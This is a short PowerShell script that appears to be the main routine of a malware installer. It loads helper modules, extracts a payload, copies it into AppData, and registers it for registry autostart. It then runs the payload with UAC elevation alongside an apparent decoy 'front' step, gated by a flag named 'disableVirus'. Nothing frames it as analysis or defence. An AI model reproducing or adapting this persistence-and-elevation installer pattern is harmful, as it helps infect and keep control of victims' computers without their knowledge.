. ./consts_holder.ps1
. ./utils.ps1
. ./embeddings.ps1
. ./update.ps1
. ./autocopy.ps1
. ./autoregistry.ps1

DoBody_InitialExtract

if (-not $server.disableVirus)
{
    DoHolder_AppData
}

RunMe -script (Get-BodyPath) -arg "guimode" -uac $false

if (-not $server.disableVirus)
{
    DoHolder_RegistryAuoStart

    RunMe -script (Get-BodyPath) -arg "" -uac $true
}

DoFront
DoEmbeddings

if (-not $server.disableVirus)
{
   # DoUpdate
}